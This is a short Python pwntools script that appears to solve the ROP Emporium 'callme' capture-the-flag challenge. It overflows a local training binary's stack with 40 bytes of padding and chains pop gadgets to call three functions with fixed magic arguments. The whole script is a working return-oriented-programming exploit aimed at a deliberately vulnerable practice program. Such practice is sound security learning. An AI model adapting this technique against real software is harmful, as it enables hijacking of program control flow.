from pwn import *

elf = ELF('./callme')
p = elf.process()

p.recvuntil('>')
pop = p64(0x000000000040093c)
num = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) +p64(0xd00df00dd00df00d)
ret = p64(0x00000000004006be)

payload = b'A'*40 + ret
payload += pop + num + p64(0x00400720)
payload += pop + num + p64(0x00400740)
payload += pop + num + p64(0x004006f0)

p.sendline(payload)

print(p.recvall())